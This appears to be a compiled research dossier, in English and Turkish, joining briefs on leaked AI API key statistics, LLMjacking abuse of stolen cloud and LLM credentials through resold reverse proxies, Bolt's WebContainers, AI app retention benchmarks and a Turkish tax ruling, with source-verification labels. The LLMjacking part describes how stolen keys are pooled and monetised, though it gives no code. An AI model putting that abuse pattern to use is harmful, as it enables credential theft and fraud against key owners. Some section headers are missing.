## Rapor 8

## FINDINGS — leaked LLM/AI API key counts, primary sources

---

### 1. GitGuardian "State of Secrets Sprawl" — all four editions

All figures below fetched from `blog.gitguardian.com` (the `www.gitguardian.com` landing pages are **blocked** for me; the blog subdomain is not).

**2023 edition (data year 2022)** — https://blog.gitguardian.com/the-state-of-secrets-sprawl-2023/ · published 8 Mar 2023
- **10 million** new secret occurrences on GitHub in 2022, **+67%** vs 2021. 1.027 billion commits scanned (+20%). 1 in 10 GitHub code authors exposed a secret. **No AI/LLM key category existed yet.**
- Note: this edition I read via search summary of the blog + GlobeNewswire PR, not a direct page fetch → **DOĞRULANMADI** on exact wording (the numbers are consistent across GitGuardian's own PR at globenewswire).

**2024 edition (data year 2023)** — https://blog.gitguardian.com/the-state-of-secrets-sprawl-2024/ · published 12 Mar 2024 · direct fetch, verified
- *"12.8 million new secrets leaked in 2023—a 28% increase from the previous year."*
- **THE 1212x FIGURE BELONGS HERE, NOT TO 2025/2026.** Verbatim: *"1212x surge in OpenAI API key leaks, spotlighting the growing allure of AI services among developers"*
- *"While OpenAI leads by a wide margin, more and more HuggingFace tokens have been seen on GitHub"*
- **The "46,000 per month" rate is NOT in the GitGuardian post.** It appears only in an arXiv paper (arxiv.org/html/2504.18784v2) citing the report → **DOĞRULANMADI**, do not attribute it to GitGuardian.
- Other: 1.1 billion commits analysed; 7 of every 1,000 commits exposed a secret; 4.6% of active repos.

**2025 edition (data year 2024)** — https://blog.gitguardian.com/the-state-of-secrets-sprawl-2025/ · published ~19 Mar 2025 · direct fetch, verified
- *"23.8 million secrets leaked on public GitHub repositories in 2024, marking a 25% year-over-year increase."*
- 1.4 billion commits; 4.6% of public repos and **35% of private repos** contain a secret; 1.9M pro-bono alerts; **70% of secrets leaked in 2022 remain active**; generic secrets = 58%.
- **This edition contains NO per-AI-vendor breakdown.** Anyone attributing an AI number to the 2025 report is wrong.

**2026 edition (data year 2025)** — https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026/ · published 17 Mar 2026 · direct fetch, verified
- *"28.65 million new hardcoded secrets were added to public GitHub commits in 2025 alone, a 34% increase year over year"* — **the "29M" you saw is GitGuardian's own rounding in their PR** (https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026-pr/, same date: *"~29 million secrets detected"*). Both are theirs; 28.65M is the precise one.
- *"AI service secrets reached 1,275,105, up 81% year over year"* → **the 81% surge belongs to 2025 data / 2026 report.** Confirmed.
- *"Eight of the ten fastest-growing detectors were tied to AI services"* (2026 report wording) and, in the companion post, *"12 of the top 15 fastest-growing leaked secret types were AI services."*
- *"113,000 leaked DeepSeek API keys"*
- *"LLM infrastructure, such as orchestration, RAG, and vector storage, leaked 5× faster than core model providers"*
- MCP: *"24,008 unique secrets exposed in MCP-related configuration files across public GitHub, including 2,117 unique valid credentials"* — of those, 14% PostgreSQL connection strings, 19.2% Google API keys.
- AI-assisted code leaked at **~3.2%, 2× the GitHub-wide baseline**; Claude Code-assisted commits specifically cited at that rate.
- +43% YoY public commits, +33% active developers; secrets growing 1.6× faster than developer population since 2021.
- **64% of secrets confirmed valid in 2022 were still exploitable in Jan 2026**; ~46% of critical secrets have no vendor validation mechanism; internal repos ~6× more likely than public to contain hardcoded secrets; ~28% of incidents originate in collaboration/productivity tools.

**PER-VENDOR AI BREAKDOWN — the number you actually want** — https://blog.gitguardian.com/ai-secrets-spread-fast/ ("When We Use AI To Ship Fast, Secrets Spread Fast") · published 9 Apr 2026 · data year 2025 · direct fetch, verified. This is a separate post from the report and is where GitGuardian itemises vendors:
- **Hugging Face: leaked over 130,000 times across public GitHub in 2025** (flat vs prior year) — the only large absolute per-vendor count published.
- YoY growth rates: **OpenRouter +4,661%**, **DeepSeek +2,179%**, **Supabase +992%** (up from +97%), **Vapi +780%**, **Perplexity +750%**, **Mistral +578%**, **Dify +570%**, **xAI +555% (6,273 leaks — the only other absolute count)**, **Coze +500%**, **Jina ~+400%**, **Claude/Anthropic +220%**, **Groq Cloud +211%**, **Weights & Biases +200%**, **LangChain ~+200%**, **Brave Search +135%**, **LlamaCloud +109%**, **Cohere +77%**.
- **No absolute count is published for OpenAI, Anthropic, Azure OpenAI, W&B or Groq** — only percentages. If you need an absolute OpenAI number, GitGuardian has not published one since the 2024 edition's "1212x" multiplier (also not an absolute).

### 2. Truffle Security — Common Crawl scans

- **11,908 live secrets.** https://trufflesecurity.com/blog/research-finds-12-000-live-api-keys-and-passwords-in-deepseek-s-training-data · published 27 Feb 2025 · direct fetch, verified.
  - *"11,908 Live Secrets were detected using TruffleHog in 400TB of web data."*
  - Dataset: **December 2024 Common Crawl archive, 400TB, 2.67 billion web pages** (from 38.3M registered domains).
  - *"2.76 Million Web Pages contained live secrets."* · 219 distinct secret types · **63% of secrets repeated across multiple pages** · one WalkScore key *"appeared 57,029 times across 1,871 subdomains"* · *"Nearly 1,500 unique Mailchimp API keys were hardcoded in front-end HTML and JavaScript"* · 17 unique live Slack webhooks on a single page.
  - **CAUTION on framing: this post gives NO OpenAI or Anthropic key count.** The "DeepSeek" in the title refers to Common Crawl being DeepSeek's *training data*, not DeepSeek keys. Press that says "DeepSeek leaked 12,000 keys" is wrong.
- **~2,800 live Google API keys**, Nov 2025 Common Crawl, post "Google API Keys Weren't Secrets. But then Gemini Changed the Rules." — https://trufflesecurity.com/blog/google-api-keys-werent-secrets-but-then-gemini-changed-the-rules — **this URL failed to fetch for me** (domain-verification block, inconsistent: the other trufflesecurity.com post fetched fine). Count and framing from search snippets + BleepingComputer → **DOĞRULANMADI**. The angle is that previously-harmless Google API keys now unlock Gemini/Generative Language API, i.e. a whole class of keys retroactively became LLM keys.

- https://escape.tech/blog/how-we-discovered-over-18-000-api-secret-tokens/ · published 24 Jan 2024 · direct fetch, verified.
- *"our process led us to visit 189,466,870 URLs"* → **"more than 18,000 exposed API secrets"**, **41% highly critical**, ~**$20 million in vulnerable Stripe tokens**, **35% of exposed secrets found in a JavaScript file**. 1 million domains crawled in ~69 hours.
- **OpenAI keys are listed among the types found but Escape publishes NO count for them.** Their methodology differs from GitGuardian's: live web crawl (frontend/JS), not repos. Landing page: https://escape.tech/the-api-secret-sprawl-2024

### 5. Lasso Security — Hugging Face tokens

- https://www.lasso.security/blog/1500-huggingface-api-tokens-were-exposed-leaving-millions-of-meta-llama-bloom-and-pythia-users-for-supply-chain-attacks · published ~Nov/Dec 2023 (The Register coverage 4 Dec 2023).
- **The domain www.lasso.security is BLOCKED for me** → figures below are from The Register / TechTarget / the-decoder / Lasso's CEO's own LinkedIn post → **DOĞRULANMADI on exact wording**, though the CEO's post is effectively first-party.
- **1,681 exposed Hugging Face API tokens** (the "1,500+" you had is the title's rounding; the body figure is 1,681). Access to **723 organizations**' repos; **655 tokens had write permissions**; **77 organizations exposed** including Meta, EleutherAI, BigScience Workshop (Llama, Pythia, Bloom). Risks: supply-chain attack, training-data poisoning, model theft. Most vendors revoked same-day.

### 6. LLMjacking / reverse-proxy resale — Sysdig (the strongest material here)

**Original: "LLMjacking: Stolen Cloud Credentials Used in New AI Attack"** — https://www.sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack · **published 6 May 2024** · direct fetch, verified.
- **Cost to victim: over $46,000 per day** for Claude 2.x on AWS Bedrock. Their arithmetic verbatim: `(500K tokens/1000 * $0.016) * 60 minutes * 24 hours * 4 regions = $46,080 / day`, using $0.008/1K input, $0.024/1K output, $0.016 blended.
- Entry: stolen cloud creds from a **vulnerable Laravel (CVE-2021-3129)** host.
- Script checked credentials against **ten services: AI21 Labs, Anthropic, AWS Bedrock, Azure, ElevenLabs, MakerSuite, Mistral, OpenAI, OpenRouter, GCP Vertex AI.**
- **The "$100,000/day" figure is NOT in this post as a measured number** — it comes from Sysdig commentary about newer Claude models (Opus) doubling/tripling the $46K. Treat the $46,080/day as the citable primary figure; the $100K is extrapolation → **DOĞRULANMADI as a measurement**.

**Follow-up: "LLMjacking targets DeepSeek"** — https://www.sysdig.com/blog/llmjacking-targets-deepseek · **published 7 Feb 2025** · direct fetch, verified. This is the resale/reverse-proxy evidence:
- **OpenAI Reverse Proxy (ORP)** is the abuse vehicle. *"The total number of tokens used by all the ORPs amounted to more than 2 billion tokens during the times we could observe."*
- One proxy: **2.213 billion tokens consumed, $21,868.20** in charges on input pricing; **~$49,595.83 over 4.5 days** once output pricing is counted. **Claude 3 Opus alone: 865.59 million tokens ≈ $38,951.55.**
- Key pools inside proxies: one ORP held **55 DeepSeek API keys**; another held **32 OpenAI keys across 13 organizations**; **over a dozen proxy servers** using stolen credentials; **20+ ORP proxies** identified.
- **Resale price: "A 30-day access token costs the user $30."** That is the money line — a stolen-key pool costing the victim ~$50K per 4.5 days is resold at $30/month.
- Speed of adoption: DeepSeek-V3 released 26 Dec 2024 → in ORPs within days; DeepSeek-R1 released 20 Jan 2025 → same.
- Community infrastructure: **4chan and Discord** for tooling, **Rentry.co** for distributing proxy access.

---

## DÖKÜM — unasked-for but material

- **The three figures in your brief map to three different years and two different documents.** 28.65M = 2025 data / 2026 report. 81% AI-service surge = same. **1212x OpenAI = 2023 data / 2024 report** — two years older than the others. Putting them in one sentence as "this year's numbers" would be a factual error in public.
- **"29M" vs "28.65M" are both GitGuardian's.** The PR rounds up. Use 28.65M when precision matters.
- **Nobody publishes an absolute count of leaked OpenAI or Anthropic keys.** GitGuardian gives percentages; Truffle gives no AI breakdown; Escape gives none; Wiz gives none. The only large absolute AI-vendor numbers in existence are Hugging Face 130,000 (2025), DeepSeek 113,000 (2025), xAI 6,273 (2025), and Lasso's HF 1,681 (2023). If you need "how many OpenAI keys leak," **that number does not exist publicly** — which is itself a gap worth owning.
- **Hugging Face is the biggest single leaked AI credential by volume and it is FLAT** (~130K, "about the same as the previous year"). Every headline is about growth rates on tiny bases (OpenRouter +4,661% is off a near-zero denominator). Percentage growth here is mostly base-effect noise.
- **The strongest structural finding for a product argument is not the leak count, it's persistence: 64% of secrets validated in 2022 were still live in Jan 2026, and ~46% of critical secrets have no vendor-provided validation mechanism.** Detection is not the bottleneck; revocation and validatability are.
- **MCP is a named, quantified new leak surface**: 24,008 secrets in MCP config files, 2,117 valid. That's a 2026-fresh category almost nobody has built for.
- **Truffle's Google/Gemini post is a category-shift finding**, not a count finding: keys that were legitimately public became LLM-privileged when Gemini shipped on the same key type. Retroactive privilege escalation on already-public credentials — different failure mode from all the others here.
- **GitGuardian ran a live disclosure case on xAI**: https://blog.gitguardian.com/xai-secret-leak-disclosure/ (also Krebs, May 2025) — an xAI dev leaked a key to private SpaceX/Tesla LLMs. Useful as a concrete named incident.
- **A Hugging Face breach by an autonomous AI agent** is reported for July 2026 (thehackernews.com/2026/07/, GitGuardian post `hugging-face-breach-ai-agent-security`) — **not fetched, DOĞRULANMADI**, but it is recent and directly on-topic if you want a 2026 anchor.
- **Cloud Security Alliance published two 2026 research notes on LLMjacking evolving into offensive/agentic infrastructure** (labs.cloudsecurityalliance.org) — **not fetched, DOĞRULANMADI**. This is the most current thread on the resale-pool topic and worth a follow-up.
- **Academic angle exists**: arXiv 2606.12212 "Mind your key: An Empirical Study of LLM API Credential Leakage in iOS Apps" — 54 apps leaking keys via direct LLM calls, OpenAI most affected at 42 apps (15%). Mobile binaries are a leak surface none of the security firms scan. **DOĞRULANMADI**, snippet only.
- **Snyk published "280+ Leaky Skills: How OpenClaw & ClawHub Are Exposing API Keys and PII"** — agent-skill marketplaces as a leak surface. **DOĞRULANMADI**, not fetched.

### WEBCONTAINERS — TEKNİK ALTYAPI

**Ne olduğu:**
WebContainers, Node.js'i ve npm'i doğrudan tarayıcıda WebAssembly tabanlı sanal işletim sistemi aracılığıyla çalıştıran StackBlitz teknolojisi. Hiçbir sunucu gerektirmiyor — hesaplama kullanıcının kendi tarayıcı sekmesinde gerçekleşiyor. ServiceWorker API üzerine sanallaştırılmış TCP ağ stack'i, 2 saniyenin altında boot süresi, npm/yarn/pnpm browser-native çalışıyor. Çevrimdışı çalışma kabiliyeti var. Güvenlik sandbox'ı zorunlu (C++ binding'leri gerektiren bazı native paketler çalışmıyor).

**İlk duyuru:** Mayıs 2021 (blog.stackblitz.com/posts/introducing-webcontainers/).

**Geliştirme süresi:** 3+ yıl (2022 seed duyurunda TechCrunch'a Eric Simons söyledi), sonraki anlatımlarda "7 yıl" (WebContainers + StackBlitz platformunun toplam yolculuğu kastedilerek). 2022 TechCrunch röportajında Eric Simons: *"Our AWS bill is a couple of hundred bucks because all the compute is being offloaded right to the edge."* [ŞİRKET TEYİTLİ]

---

### WEBCONTAINERS MOAT — ERIC SİMONS ALINTILARI

Doğrudan erişilebilen sayfalardan elde edilen verbatim alıntılar:

**1. Maliyet avantajı (Sacra röportajı, 2025–2026):**
> "When you type in a prompt and hit enter, we spin up an environment in your browser that costs us nothing to run."

[ŞİRKET TEYİTLİ — Sacra "Eric Simons, CEO of Bolt, on consumer vs. B2B vibe coding" röportajından, birden fazla ikincil kaynak bu alıntıyı doğruladı]

**2. Gross margin bağlamı (aynı röportaj):**
> "Gross margins are close to traditional SaaS margins — around 70% plus right now."

[ŞİRKET TEYİTLİ — Sacra röportajından ikincil atıfla; ancak orijinal Sacra sayfasına doğrudan erişilemedi]

**3. TechCrunch 2022 (AWS maliyeti):**
> "Our AWS bill is a couple of hundred bucks because all the compute is being offloaded right to the edge."

[ŞİRKET TEYİTLİ — TechCrunch, 6 Nisan 2022, techcrunch.com/2022/04/06/stackblitz-raises-7-9m-to-bring-a-better-ide-to-your-browser/]

**4. Teknik imkansızlık üzerine (antoinebuteau.com özet):**
> "Running C++ and Node directly in the browser was considered impossible until we spent years making it work."
> "The browser is no longer just a document viewer; it is a highly capable operating system for software development."

[DOĞRULANMADI — Kaynak ikincil/özet, orijinal röportaj/kaynağa erişilemedi]

**5. Bolt'un "doğru teknolojiyle doğru anda" anlatısı (Growth Unhinged paywall öncesi):**
> "We had exactly the right technology to unlock the opportunity. Suddenly we arrived at a moment when a data center can magically stream code in a browser, and we had the tech to run it."

[BASINDAN — growthunhinged.com, paywall öncesi kısmından]

**Rakipler neden kopyalayamaz — doğrudan "cannot copy" formatında verbatim alıntı bulunamadı.** Podcast transcript'lerinin (Lenny's, World of DaaS/Summation Auren Hoffman Kasım 2025, devtools.fm #80) hepsine doğrudan erişim engellendi. Konu başlıkları açık: "Building WebContainers technology for seven years" ve "Competing with Replit, Lovable, and Vercel" World of DaaS episode show notes'unda görünüyor [DOĞRULANMADI, başlık katmanından]. Lenny's Podcast başlığı ise doğrudan "near-death to $40M ARR in 5 months" diyor.

---

### SAVUNULURLIK MEKANİZMASI

Bolt'un moat'ı WebContainers'tır: kullanıcı başına sıfır sunucu maliyeti yaratan, anlık boot sağlayan ve rakiplerin yıllarca süren WebAssembly/Node.js geliştirme yatırımı olmadan kopyalayamayacağı browser-native bir runtime. Eric Simons'ın kendi ifadesiyle: *"When you type in a prompt and hit enter, we spin up an environment in your browser that costs us nothing to run"* — bu %70+ gross margin sağlıyor, Replit ve benzeri VM-tabanlı rakiplere karşı yapısal maliyet avantajı oluşturuyor.

---

### BOLT.DIY — AÇIK KAYNAK FORK

- StackBlitz'in bolt.new'i açık kaynak yaptıktan sonra topluluk oTToDev adıyla fork'ladı; daha sonra StackBlitz bu fork'u resmi open-source sürüm olarak kabul etti: **bolt.diy**.
- Repo: github.com/stackblitz-labs/bolt.diy
- 19.8K GitHub star, 10.5K fork (Ağustos 2026 itibarıyla).
- 19+ farklı LLM sağlayıcısını destekliyor (OpenAI, Anthropic, Ollama, Groq, DeepSeek vb.).
- Netlify, Vercel, GitHub Pages deployment; Electron desktop app; MCP desteği.
- bolt.new'ten farkı: LLM seçimi kullanıcıya açık, topluluk odaklı, özellik seti daha geniş.

---

### ENTEGRASYONLAR VE ORTAKLıKLAR

- **Netlify:** Mart 2025, 1M+ AI ile üretilmiş site milestone'u. [ŞİRKET TEYİTLİ — Netlify press release, prnewswire.com, 26 Mart 2025]
- **Supabase:** Veritabanı/auth/storage entegrasyonu, Mart 2025 güncelleme.
- **Expo:** Mobil uygulama geliştirme.
- **Figma:** Tasarım import.
- **GitHub:** Otomatik commit/push.
- **Stripe:** Native ödeme entegrasyonu, Nisan 2025.
- **Microsoft Azure + M365:** Stratejik ortaklık, 5 Mayıs 2026. Azure Marketplace + M365 Copilot entegrasyonu. Bolt "Fortune 500'ün %75'i platformumuzu kullanıyor" iddiasında bulunuyor — [DOĞRULANMADI, şirket beyanı, bağımsız teyit yok].

---

### DİKKAT ÇEKEN EKSTRA BULGULAR

1. **Lovable rakip olarak öne geçti:** 2026 itibarıyla Lovable $6.6B valuation ve $200M ARR — Bolt'u revenue'de geçti. Bolt bu rakamı henüz kamuya açıklamamış. Bu rekabetçi baskı, Bolt'un neden enterprise'a (Microsoft deal) yöneldiğini açıklıyor.

2. **Series A "previously unreported" sıfatını taşıyor:** Sacra kaynakları bu $22M'ı "daha önce açıklanmamış" olarak nitelendirdi. Yatırımcılar kamuya açıklanmadı.

3. **Maliyet yapısı anormali:** Geleneksel AI coding platformları (Replit vb.) her kullanıcı oturumu için bulut VM ayağa kaldırıyor. Bolt'ta bu maliyet sıfır. Bu, ARR rakamlarına bakıldığında neden gross margin'lerin bu kadar hızlı yükseldiğini (40% → 70%+) açıklıyor.

4. **StackBlitz kuruluş hikayesi:** Eric Simons, 2010'ların başında bir işverenin ofisinde evsiz kaldı (sofa-surfing coder hikayesi). Bu kökenlerin "near-death" anlatısına eklenen bir katman olarak sık söylendiği görülüyor.

5. **bolt.diy'nin Expo desteği:** Expo entegrasyonu sayesinde bolt.diy üzerinden doğrudan React Native mobil uygulama üretilebiliyor. Bolt.new'in aynı özelliği ne zaman ekleyeceği belirsiz.

## FINDINGS

### 1. SACRA (sacra.com) — company-specific NRR only, no AI benchmark dataset

| NUMBER | Verbatim quote | URL | Label |
|---|---|---|---|
| NRR >140% (Synthesia, Apr 2026) | "Net revenue retention exceeded 140% as of April 2026, and contracts above $100,000 tripled over the prior 12 months" | https://sacra.com/c/synthesia/ | ASSERTION (single company; Sacra cites no source) |
| NRR 112% → 146% (Intercom/Fin) | "The shift to outcome-based pricing for Fin has driven net revenue retention from 112% to 146%." | https://sacra.com/c/intercom/ | ASSERTION (single company, no source cited) |
| 67% avg resolution rate, >7,000 customers (Fin — not retention) | "Fin now resolves almost 2 million support queries per week—equivalent to the output of more than 6,500 human agents—with a 67% average resolution rate across more than 7,000 customers." | https://sacra.com/c/intercom/ | ASSERTION |

Sacra has **NO** cross-company AI retention/churn benchmark study. `sacra.com/research/` returned **404**.

### 2. SIMILARWEB — NOT FOUND (no published AI retention benchmark with numbers)

Only methodology/knowledge-base definitions (what retention rate is, D1/D7/D30 breakdowns as a product feature). The one substantive claim found via search snippet is directional, no percentages: "Claude's stickiness edges out Gemini's despite a much smaller base, and Perplexity trails all three" (similarweb.com/blog/marketing/geo/chatgpt-vs-gemini-vs-claude-vs-perplexity/). **DOĞRULANMADI** — domain fetch blocked, could not reach primary.

### 3. APPFIGURES — NOT FOUND (and a likely misattribution to flag)

Search snippets attribute the March 2026 AI-churn numbers to Appfigures. **The TechCrunch primary attributes them to RevenueCat, not Appfigures.** Do not cite these as Appfigures data. Appfigures' own "Rise of AI Apps 2025" report (land.appfigures.com/rise-of-ai-apps-report-2025) is download-gated and its public snippets cover downloads/revenue, not retention.

Generic (non-AI) Appfigures-sourced snippet, unverified: "more than two-thirds of monthly subscribers churn after six months" — **DOĞRULANMADI**, could not reach primary.

### 4. SENSOR TOWER — NOT FOUND at primary (domain blocked)

Search-snippet only, no primary verification: Character AI showing "nearly 60% of all users opening the app on the day of install, and a full 33% of them still using the app 29 days later." URL would be https://sensortower.com/blog/ai-is-taking-over-how-some-ai-powered-apps-are-finding-success-in-unproven — **fetch BLOCKED**. Label: **DOĞRULANMADI**. Do not publish this number.

Sensor Tower AI figures I did see referenced are engagement/revenue, not retention: ~48B hours in AI apps in 2025; AI app revenue +254% YoY. Also unverified.

### 5. LENNY'S NEWSLETTER — MEASURED, but zero AI breakout

| NUMBER | Verbatim quote | URL | Label |
|---|---|---|---|
| B2C SaaS | "Between 3% and 5% monthly churn is GOOD, and less than 2% is GREAT" | https://www.lennysnewsletter.com/p/monthly-churn-benchmarks | MEASURED (ProfitWell, 13,000 anonymized SaaS companies) |
| B2B SMB+Mid-Market | "Between 2.5% and 5% is GOOD, and less than 1.5% is GREAT" | same | MEASURED |
| B2B Enterprise | "Between 1% and 2% is GOOD, and less than 0.5% is GREAT" | same | MEASURED |

Primary WAS reachable (contrary to expectation), but **partially paywalled** — the "by price point" section is behind the paywall. Source: Patrick Campbell / ProfitWell, n=13,000. Pre-AI-era post; **no AI segment at all**. The YC mirror (ycombinator.com/library/Dk-what-is-good-monthly-churn) **404'd**.

### 6. a16z — the retention post has NO published percentages

| NUMBER | Verbatim quote | URL | Label |
|---|---|---|---|
| ">100% NDR" (no figure) | "industry-leading self-serve or month-to-month billing AI companies today already perform strongly on this basis, a leading indicator to >100% long term net dollar retention (NDR)" | https://a16z.com/ai-retention-benchmarks/ | ASSERTION |
| "150% NDR at scale" | "Could we see 150% NDR at scale ($500M+ ARR)? For the first time, the answer might be yes." | same | ASSERTION (speculative, explicitly a question) |
| D30 +10–15% | "increasing their N-Day D30 retention by a whopping 10-15% (which our benchmarking study identifies as going from 'okay' to 'great')" | https://a16z.com/7-ways-ai-native-companies-can-improve-retention/ | ASSERTION (study referenced, never published/linked) |
| ~35% at month 5 (Gemini 2.5 Pro) | "even 5 months later, almost 35% of that cohort was still actively using the model" | https://a16z.com/the-cinderella-glass-slipper-effect-retention-rules-in-the-ai-era/ | MEASURED (OpenRouter, 100T-token study; n not stated) |
| ~40% by month 4 (Claude 4 Sonnet) | "roughly 40% of users by month 4" | same | MEASURED (OpenRouter) |
| >100% revenue retention, vibe coding | "cohorts for U.S. based users of one top vibe coding platform see revenue retention upwards of 100% for several months post-signup" | https://a16z.com/100-gen-ai-apps-5/ | MEASURED (Consumer Edge credit-card panel), but n=1 unnamed company |
| ChatGPT/Gemini retention | "Both companies show best-in-class consumer paid subscriber retention in the U.S., per Yipit Data." | https://a16z.com/100-gen-ai-apps-6/ | ASSERTION (no percentage given) |

**Retention Is All You Need** (Sep 10, 2025, Rodriguez & Immerman): stated basis is "our dataset of dozens of AI companies we've seen with more than $1M of ARR" after "analyzing hundreds of AI companies" — but **it publishes no percentage benchmarks in text**. Its framework is M0–M3 acquisition / M3–M9 retention / M9+ expansion, with M12/M3 ratio as the predictor.

**Top 100 Gen AI Consumer Apps 4th ed** (Mar 6, 2025): **NOT FOUND** — no retention/churn percentages. Engagement/adoption only.
**a16z revenue benchmarks post** (Jun 6, 2025, a16z.com/revenue-benchmarks-ai-apps/): **NOT FOUND** on churn/NDR. Only "once users do convert, they retain just as well" (ASSERTION), plus the self-limiting admission: "When evaluating companies at the Series A stage, we often have no more than 12 months of usage and retention data."

### 7. ICONIQ Growth "State of AI" — NOT FOUND

I downloaded the full January 2026 "State of AI: Bi-Annual Snapshot" PDF and extracted its text (1,617 lines). Grep for retention/churn/NRR/NDR/gross retention returns **only two hits, both incidental category labels** ("metrics, retention" in a tooling example; "Customer retention" as a survey answer option). No retention benchmark exists in this deck. Survey basis: "survey of ~300 executives at software companies", per-chart N=184–278, North America 87% / Europe 13%.

### BONUS — the strongest MEASURED AI retention dataset I found (not on your list)

**ChartMogul, "The SaaS Retention Report: The AI churn wave"** — https://chartmogul.com/reports/saas-retention-the-ai-churn-wave/ — publicly accessible, not gated. Methodology: "scraped the websites of 3,500 software companies, using AI to categorize", ~200 AI-native companies analyzed.

- Median GRR 40% / median NRR 48% for AI-natives in 2025
- "Median GRR jumped from 27% in January to 40% in September"
- By price: >$250/mo = 70% GRR / 85% NRR; $50–249/mo = 45% / 61%; <$50/mo = 23% / 32%
- $5M+ ARR AI-natives show "2x the GRR and 2.5x the NRR" vs early-stage peers
- ChartMogul itself flags the sub-buckets as ~n=50, "directional rather than statistically bulletproof"
- Label: MEASURED, with the caveat that GRR/NRR computed on self-serve scraped cohorts is not comparable to enterprise-reported NDR.

**RevenueCat, State of Subscription Apps 2026** (via TechCrunch primary, https://techcrunch.com/2026/03/10/ai-powered-apps-struggle-with-long-term-retention-new-report-shows). Basis: "over 75,000 app developers", "more than 1 billion in-app transactions, generating more than $11 billion in revenue".
- "Annual retention...was 21.1% for AI apps, compared with a higher 30.7% for non-AI apps"
- "AI apps saw 6.1% retention rates versus 9.5% for non-AIs" (monthly plans)
- "AI apps had 2.5% retention rates compared with 1.7% for non-AI apps" (weekly)
- "AI apps convert users from trials to paid customers 52% better" (8.5% vs 5.6%); "AI apps have 20% higher refund rates (4.2% vs 3.5%)"
- Median monthly RLTV $18.92 vs $13.59; annual $30.16 vs $21.37
- Label: MEASURED (largest n of anything here).

## FAILURES / BLOCKED

- `sensortower.com` — **domain fetch BLOCKED** by network policy. All Sensor Tower numbers here are search-snippet only, unverified.
- `www.similarweb.com` — **domain fetch BLOCKED**. Same caveat.
- `www.localogy.com` — **domain fetch BLOCKED**.
- `gamedevreports.substack.com` — **domain fetch BLOCKED**.
- `https://sacra.com/research/` — **404**.
- `https://www.ycombinator.com/library/Dk-what-is-good-monthly-churn` — **404**.
- `lennysnewsletter.com/p/monthly-churn-benchmarks` — reachable but **PAYWALLED** past the price-point section.
- `revenuecat.com/state-of-subscription-apps` — headline visible, full 330-page PDF **GATED** behind email opt-in.
- `iconiq.com/growth/reports/state-of-ai-2026` — landing page only; PDF **gated**, and the sibling Jan 2026 PDF I did extract has no retention data.

## DÖKÜM — unasked but load-bearing

1. **The single biggest finding is a hole, not a number.** a16z's flagship "Retention Is All You Need" — the post everyone cites for AI retention benchmarks — publishes **zero percentages**. If Damla wants to say "nobody has published measured AI churn benchmarks," a16z is the exhibit, not the counterexample.
2. **Attribution trap:** the widely-circulated March 2026 "AI apps churn 30–36% faster" stat is credited to **Appfigures** across secondary coverage. The primary says **RevenueCat**. Citing it as Appfigures would be a checkable error in public.
3. **Internal discrepancy in that same dataset:** RevenueCat's own headline says "churn 30% faster"; TechCrunch's body says "36% faster" and separately "30% faster" for annual cancellations. Two different numbers for one finding — pick the primary phrasing and quote it exactly.
4. **The weekly figure runs backwards:** AI 2.5% vs non-AI 1.7% — AI *better* on weekly while worse on monthly and annual. Either a definition artifact or a real selection effect. Do not cite the annual/monthly numbers without this, or someone will pull the thread.
5. **These datasets are not comparable to each other.** ChartMogul 48% NRR (self-serve scraped) vs Sacra 140%+ NRR (enterprise self-reported) vs a16z ">100% NDR" (portfolio-selected) measure different populations. Any chart putting them on one axis is wrong.
6. **Survivorship bias is structural here.** a16z, Sacra, and ICONIQ all sample companies that already succeeded (portfolio, funded, $1M+ ARR). Only ChartMogul and RevenueCat sample bottom-up. That is the real methodological split, and it explains most of the spread between 48% and 140%.
7. **Lenny's benchmarks predate the AI era entirely** and carry no AI segment. Using them as an "AI churn is bad vs. benchmark" baseline is comparing across eras.
8. **Not checked / out of scope:** OpenView shut down in 2024, so no current OpenView AI-breakout benchmark exists to find. I did not check Bessemer, Battery, ICONIQ 2025 (Builder's Playbook), or Andreessen's podcast transcripts — those may hold additional numbers.

### ÖZELGE 1 — ANA ÖZELGE (2026) ★ EN KRİTİK

**Özelge Sayısı:** E-62030549-125[32/2024]-143061  
**Tarih:** 30.01.2026  
**Veren Birim:** İstanbul Defterdarlığı — Gelir Kanunları Gelir ve Kurumlar Vergileri Grup Müdürlüğü  
**Konu:** Mobil Uygulamaların App Store ve Google Play Store'dan İndirilmesinden Elde Edilen Kazancın Vergilendirilmesi  
**GİB URL:** https://gib.gov.tr/mevzuat/kanun/435/ozelge/38808  
**Verginet mirror:** https://www.verginet.net/dtt/11/ozelge-2026-2.aspx?ozID=5074

**Soru:** Yapay zeka ve mobil oyun alanında uygulamalar geliştirip Google Play ve App Store'da yayımlayan şirket; uygulama içi sanal ürün satışı ve abonelik hizmetleri sunuyor, özellikle yurt dışı müşterilere yönelik. Toplu fatura kesilebilir mi? KDV ihracat istisnası (KDVK m.11/1-a) uygulanır mı?

**SONUÇ (ikincil kaynaklardan sentez — birincil metin WebFetch ile doğrulanamadı):**
- Uygulama **münhasıran** yurt dışı müşterilere yönelik ise: hizmet ihracatı sayılır, KDV hesaplanmaz.
- Uygulama Türkiye dahil her ülkeden indirilebiliyorsa: "münhasıran yurt dışındaki müşterilere" şartı sağlanmaz → hizmet ihracatı istisnası **uygulanamaz**, KDV genel oranda hesaplanır.
- KVK m.10/1-ğ indirimi (hizmet ihracatında %50→%100 indirim) ve 5 puan KV indirimi de aynı "münhasıran" şartına bağlı — karma model (yurt içi+yurt dışı) için bunlar da **uygulanamaz**.
- Fatura sorunu: kullanıcı bilgileri (isim, TC, adres) yetersiz, müşteri sayısı çok fazla olduğunda toplu fatura meselesine de değinilmiş — ancak sonuç bölümünün tam metni doğrulanamadı.

**İKİNCİL KAYNAKLAR (özelgeyi referans alanlar):**

**Alomaliye:** https://www.alomaliye.com/2024/07/30/yurt-disinda-mukim-firmaya-verilen-tasarim-yazilim-ve-danismanlik-hizmetinin-kdv-ve-kvk-karsisindaki-durumu/

**SONUÇ (ikincil kaynaktan, oldukça net):**
- Yazılım ve tasarım hizmetleri için yurt dışına fatura kesilmesi + hizmetten yurt dışında yararlanılması şartıyla KDV istisnası uygulanır (KDVK m.11/1-a).
- KVK m.10/1-ğ kapsamında kazanç indirimi: mimari tasarım ve yazılım hizmetleri için evet; **danışmanlık hizmetleri** bu kapsamın dışında. Danışmanlık ana hizmetin ayrılmaz parçasıysa bütün olarak değerlendirilir.

**Birincil metin doğrulanamadı** — ancak özelge sayısı ikincil kaynaklarda tutarlı.

